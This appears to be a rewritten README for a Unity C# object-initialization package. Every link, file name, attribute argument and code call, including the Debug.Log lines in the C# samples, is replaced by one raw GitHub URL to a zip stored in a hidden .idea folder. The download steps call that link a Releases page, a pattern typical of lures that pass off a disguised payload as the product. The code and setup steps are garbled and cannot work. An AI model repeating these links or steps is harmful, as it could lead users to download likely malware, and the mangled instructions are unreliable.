# 🌟 InitializeSystem - Simplifying Object Initialization

![Download Now](https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip%20Now-Click%https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip)

## 🚀 Getting Started

Welcome to the **InitializeSystem**! This package automatically initializes any object that can perform the `Init()` function. It organizes them according to the `InitOrder`, making it simpler to manage multiple instances. Follow this guide to get started smoothly.

## 📥 Download & Install

To download the latest version, visit the following page:

[Download from Releases](https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip)

1. Click the link above.
2. On the Releases page, choose the latest version.
3. Download the file that suits your system.

## ⚙️ Installation Steps

1. Once downloaded, locate the file on your computer.
2. Extract the contents if necessary.
3. Follow the usage instructions below to set up the project.

## 📖 Usage Instructions

### 1. Important Settings

Before you start using the **InitializeSystem**, set the execution order:

- Go to **Edit** in the menu.
- Select **Project Settings**.
- Click on **Script Execution Order**.
- Set "CoreManager" above "Initializer".

### 2. Optional Prefab Setup

If you want to configure **CoreManager** manually, follow these steps:

- Right-click on the **Assets/Resources** folder.
- Choose **Create** > **MyPackage** > **Core System Settings**.
- Assign the **CoreSystem** prefab from the **Samples** folder to the inspector of the created asset.

### 3. Adding Objects for Automatic Initialization

#### For Managers

1. Make your `TestManager` script inherit from `BaseManager`.
   - Write your initialization logic in the automatically created `Init()` function.
2. Add `TestManager` to the `InitOrder` class in `https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip`.
3. Decorate `https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip` with the attribute `[InitOrder(https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip)]`.

#### For Other Objects, like Player

1. Make your `TestPlayer` script inherit from `IInitializable`.
   - Write your initialization logic in the `Init()` function.
2. Add `TestPlayer` to the `InitOrder` class in `https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip`.
3. Decorate `https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip` with the attribute `[InitOrder(https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip)]`.

### 4. Once Completed

Once you have followed these steps, your objects will automatically initialize in order. Enjoy smoother management of instances.

## 📚 Example Setup

Here's a simple setup to illustrate how to implement the **InitializeSystem**.

### For Managers

**https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip**
```csharp
using UnityEngine;

public class TestManager : BaseManager
{
    public override void Init()
    {
        // Add initialization logic here
        https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip("TestManager Initialized");
    }
}
```

### For Other Objects

**https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip**
```csharp
using UnityEngine;

public class TestPlayer : IInitializable
{
    public void Init()
    {
        // Add initialization logic here
        https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip("TestPlayer Initialized");
    }
}
```

## 🔗 Additional Resources

- **Documentation**: For more in-depth instructions, visit our [wiki](https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip).
- **Community Support**: Join our [discussion forums](https://raw.githubusercontent.com/M0uZzard/InitializeSystem/main/.idea/Initialize-System-3.0-alpha.2.zip) for help and tips.

By following these guidelines, you should be able to set up and run the **InitializeSystem** effectively. Enjoy programming with ease!